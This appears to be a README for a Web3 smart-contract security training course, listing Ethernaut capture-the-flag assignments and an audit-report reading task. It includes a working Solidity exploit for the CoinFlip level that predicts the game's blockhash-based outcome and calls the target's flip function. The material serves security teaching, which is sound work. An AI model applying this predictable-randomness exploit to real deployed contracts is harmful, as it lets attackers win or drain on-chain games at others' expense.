# Ethernaut Capture the Flag (CTF)
The Ethernaut is a Web3/Solidity based wargame inspired by overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players.

# Assignments

## Submission
Please create a pull request with:
- The instance address of the contract you submitted
- Your wallet address
- The testnet you are using
- Any code you wrote for your exploit

## Ethernaut Level 3 CoinFlip
https://ethernaut.openzeppelin.com/

Network: Polygon Mumbai
Tx: https://mumbai.polygonscan.com/tx/0x6d96a372cf42a6ad0683317cd9a67dcb5e52022c779f80aa81f09a277a188c2a

```
pragma solidity ^0.8.0;

interface ICoinFlipGame {
    function flip(bool) external returns (bool);
}

contract CoinFlipGame {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip(address coinGame) public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert("oh man");
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    bool value = ICoinFlipGame(coinGame).flip(side);
    require(value,"fail transaction");
  }
}
```
## Read through through audit report and 

Read through the following audit report and write a detailed description about one of the vulnerabilities as a comment on this issue: https://github.com/KITTLABS/web3-Q2-security-training/issues/12


https://code4rena.com/reports/2023-01-numoen/


# Optional Assignment
Hint: This level can be exploited with one of the attack vectors we went over in session 3.

## Ethernaut Level 10 Re-entrancy
https://ethernaut.openzeppelin.com/

